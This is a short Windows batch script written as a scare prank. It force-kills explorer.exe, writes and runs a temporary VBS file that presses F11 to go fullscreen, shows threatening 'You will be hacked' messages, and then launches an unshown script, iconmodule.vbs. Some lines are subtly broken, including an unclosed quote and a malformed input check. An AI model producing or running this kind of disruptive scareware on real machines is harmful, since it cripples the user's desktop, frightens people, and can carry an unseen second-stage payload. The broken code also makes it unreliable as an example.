taskkill /Im explorer.exe /f

@ECHO OFF

:VBSDynamicBuild
SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 1                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 1                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

:1
color a
echo You will be hacked, you scared? (answer in only yes/no)
set /p input=
if /i %input%==yes goto 2
if /i %input%==no goto 2
if /i not %input%== Yes,no goto 1

:2
echo But lol, you don`t have any chance...
echo You Just Got Hacked!
timeout 3
start iconmodule.vbs
